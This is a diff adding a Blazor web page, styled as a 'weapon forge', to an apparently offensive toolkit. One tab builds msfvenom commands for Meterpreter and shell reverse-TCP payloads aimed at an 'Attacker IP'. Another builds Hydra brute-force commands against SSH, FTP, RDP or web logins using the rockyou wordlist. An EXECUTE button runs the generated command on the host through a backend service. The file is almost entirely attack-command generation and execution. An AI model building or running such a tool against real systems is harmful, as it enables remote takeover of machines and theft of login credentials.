@@ -1,0 +1,193 @@
+﻿@page "/armory"
+@using Myrddraal.Services
+@inject BladeRunner Blade
+@inject ISnackbar Snackbar
+@inject IJSRuntime JSRuntime
+
+<MudText Typo="Typo.h5" Class="mb-4" Style="font-family:'Courier New'; color: #e0e0e0;">
+    > THAKAN'DAR BLADES // WEAPON_FORGE
+</MudText>
+
+<MudGrid>
+    <MudItem xs="12" md="6">
+        <MudPaper Class="pa-4" Elevation="0" Style="border: 1px solid #333; background: #0a0a0a; min-height: 450px;">
+            <MudTabs Elevation="0" Rounded="true" ApplyEffectsToContainer="true" PanelClass="pa-4" Color="MudBlazor.Color.Dark">
+
+                <MudTabPanel Text="PAYLOAD GEN" Icon="@Icons.Material.Filled.BugReport">
+                    <MudText Typo="Typo.caption" Class="mb-4 d-block" Style="color: #666;">METASPLOIT PAYLOAD CONSTRUCTOR</MudText>
+
+                    <MudSelect T="string" Label="TARGET OS" @bind-Value="_payloadOs" Variant="Variant.Outlined" Class="mb-3">
+                        <MudSelectItem Value="@("windows")">Windows</MudSelectItem>
+                        <MudSelectItem Value="@("linux")">Linux</MudSelectItem>
+                        <MudSelectItem Value="@("android")">Android</MudSelectItem>
+                    </MudSelect>
+
+                    <MudSelect T="string" Label="ARCH / TYPE" @bind-Value="_payloadType" Variant="Variant.Outlined" Class="mb-3">
+                        <MudSelectItem Value="@("meterpreter/reverse_tcp")">Meterpreter Reverse TCP</MudSelectItem>
+                        <MudSelectItem Value="@("shell/reverse_tcp")">Shell Reverse TCP</MudSelectItem>
+                        <MudSelectItem Value="@("exec")">Execute Command (Exec)</MudSelectItem>
+                    </MudSelect>
+
+                    <MudGrid>
+                        <MudItem xs="8">
+                            <MudTextField @bind-Value="_lhost" Label="LHOST (Attacker IP)" Variant="Variant.Outlined" />
+                        </MudItem>
+                        <MudItem xs="4">
+                            <MudTextField @bind-Value="_lport" Label="LPORT" Variant="Variant.Outlined" />
+                        </MudItem>
+                    </MudGrid>
+
+                    <MudSelect T="string" Label="OUTPUT FORMAT" @bind-Value="_format" Variant="Variant.Outlined" Class="mt-3">
+                        <MudSelectItem Value="@("exe")">.exe (Windows Executable)</MudSelectItem>
+                        <MudSelectItem Value="@("elf")">.elf (Linux Executable)</MudSelectItem>
+                        <MudSelectItem Value="@("raw")">Raw Shellcode</MudSelectItem>
+                        <MudSelectItem Value="@("py")">Python Script</MudSelectItem>
+                    </MudSelect>
+
+                    <MudButton Variant="Variant.Filled"
+                               Color="MudBlazor.Color.Error"
+                               Class="mt-6"
+                               FullWidth="true"
+                               StartIcon="@Icons.Material.Filled.Construction"
+                               OnClick="GeneratePayloadCommand">
+                        FORGE PAYLOAD
+                    </MudButton>
+                </MudTabPanel>
+
+                <MudTabPanel Text="BRUTE FORCE" Icon="@Icons.Material.Filled.LockOpen">
+                    <MudText Typo="Typo.caption" Class="mb-4 d-block" Style="color: #666;">HYDRA COMMAND BUILDER</MudText>
+
+                    <MudTextField @bind-Value="_bruteTarget" Label="TARGET IP" Variant="Variant.Outlined" Class="mb-3" />
+
+                    <MudSelect T="string" Label="SERVICE" @bind-Value="_bruteService" Variant="Variant.Outlined" Class="mb-3">
+                        <MudSelectItem Value="@("ssh")">SSH</MudSelectItem>
+                        <MudSelectItem Value="@("ftp")">FTP</MudSelectItem>
+                        <MudSelectItem Value="@("rdp")">RDP</MudSelectItem>
+                        <MudSelectItem Value="@("http-post-form")">HTTP POST</MudSelectItem>
+                    </MudSelect>
+
+                    <MudGrid>
+                        <MudItem xs="6">
+                            <MudTextField @bind-Value="_userList" Label="USER LIST (Path)" Placeholder="/usr/share/wordlists/..." Variant="Variant.Outlined" />
+                        </MudItem>
+                        <MudItem xs="6">
+                            <MudTextField @bind-Value="_passList" Label="PASS LIST (Path)" Placeholder="rockyou.txt" Variant="Variant.Outlined" />
+                        </MudItem>
+                    </MudGrid>
+
+                    <MudButton Variant="Variant.Filled"
+                               Color="MudBlazor.Color.Warning"
+                               Class="mt-6"
+                               FullWidth="true"
+                               StartIcon="@Icons.Material.Filled.VpnKey"
+                               OnClick="GenerateBruteCommand">
+                        BUILD ATTACK VECTOR
+                    </MudButton>
+                </MudTabPanel>
+            </MudTabs>
+        </MudPaper>
+    </MudItem>
+
+    <MudItem xs="12" md="6">
+        <MudPaper Class="pa-4" Elevation="0" Style="border: 1px solid #333; background: #000; height: 100%; min-height: 450px; display: flex; flex-direction: column;">
+            <MudText Typo="Typo.caption" Style="color: #555;">GENERATED WEAPON CODE</MudText>
+
+            <div style="flex-grow: 1; display: flex; align-items: center; justify-content: center;">
+                @if (string.IsNullOrEmpty(_generatedCommand))
+                {
+                    <div style="text-align: center; color: #333;">
+                        <MudIcon Icon="@Icons.Material.Filled.Hardware" Size="MudBlazor.Size.Large" Style="width: 64px; height: 64px;" />
+                        <MudText Typo="Typo.body1" Class="mt-2">THE ANVIL IS COLD</MudText>
+                    </div>
+                }
+                else
+                {
+                    <div style="width: 100%;">
+                        <div style="font-family: 'Courier New', monospace; color: #ff9800; background: #1a1a1a; padding: 15px; border-left: 3px solid #ff9800; word-break: break-all;">
+                            @_generatedCommand
+                        </div>
+
+                        <div class="d-flex gap-2 mt-4 justify-center">
+                            <MudButton Variant="Variant.Outlined" Color="MudBlazor.Color.Inherit" OnClick="CopyToClipboard" StartIcon="@Icons.Material.Filled.ContentCopy">COPY</MudButton>
+                            <MudButton Variant="Variant.Filled" Color="MudBlazor.Color.Success" OnClick="ExecuteBlade" StartIcon="@Icons.Material.Filled.PlayArrow">EXECUTE</MudButton>
+                        </div>
+                    </div>
+                }
+            </div>
+
+            @if (!string.IsNullOrEmpty(_executionOutput))
+            {
+                <MudDivider Class="my-3" />
+                <div style="max-height: 150px; overflow-y: auto; font-family: 'Courier New'; font-size: 12px; color: #ccc;">
+                    > OUTPUT:<br />
+                    @_executionOutput
+                </div>
+            }
+        </MudPaper>
+    </MudItem>
+</MudGrid>
+
+@code {
+    // Payload Vars
+    private string _payloadOs = "windows";
+    private string _payloadType = "meterpreter/reverse_tcp";
+    private string _lhost = "192.168.1.X";
+    private string _lport = "4444";
+    private string _format = "exe";
+
+    // Brute Vars
+    private string _bruteTarget = "";
+    private string _bruteService = "ssh";
+    private string _userList = "users.txt";
+    private string _passList = "/usr/share/wordlists/rockyou.txt";
+
+    // Output
+    private string _generatedCommand = "";
+    private string _executionOutput = "";
+
+    private void GeneratePayloadCommand()
+    {
+        string payloadString = $"{_payloadOs}/{_payloadType}";
+        if (_payloadOs == "linux" && _payloadType == "exec") payloadString = "linux/x64/exec";
+
+        _generatedCommand = $"msfvenom -p {payloadString} LHOST={_lhost} LPORT={_lport} -f {_format} -o shell.{_format}";
+        _executionOutput = "";
+    }
+
+    private void GenerateBruteCommand()
+    {
+        if (string.IsNullOrEmpty(_bruteTarget))
+        {
+            Snackbar.Add("TARGET IP REQUIRED", Severity.Warning);
+            return;
+        }
+        _generatedCommand = $"hydra -L {_userList} -P {_passList} {_bruteTarget} {_bruteService}";
+        _executionOutput = "";
+    }
+
+    private async Task CopyToClipboard()
+    {
+        await JSRuntime.InvokeVoidAsync("navigator.clipboard.writeText", _generatedCommand);
+        Snackbar.Add("COPIED TO CLIPBOARD", Severity.Success);
+    }
+
+    private async Task ExecuteBlade()
+    {
+        _executionOutput = "> ATTEMPTING EXECUTION...\n";
+        StateHasChanged();
+
+        try
+        {
+            var parts = _generatedCommand.Split(' ', 2);
+            var cmd = parts[0];
+            var args = parts.Length > 1 ? parts[1] : "";
+
+            var result = await Blade.ExecuteBladeAsync(cmd, args);
+            _executionOutput += result;
+        }
+        catch (Exception ex)
+        {
+            _executionOutput += $"[ERROR]: Tool not found or execution failed.\n{ex.Message}";
+        }
+    }
+}
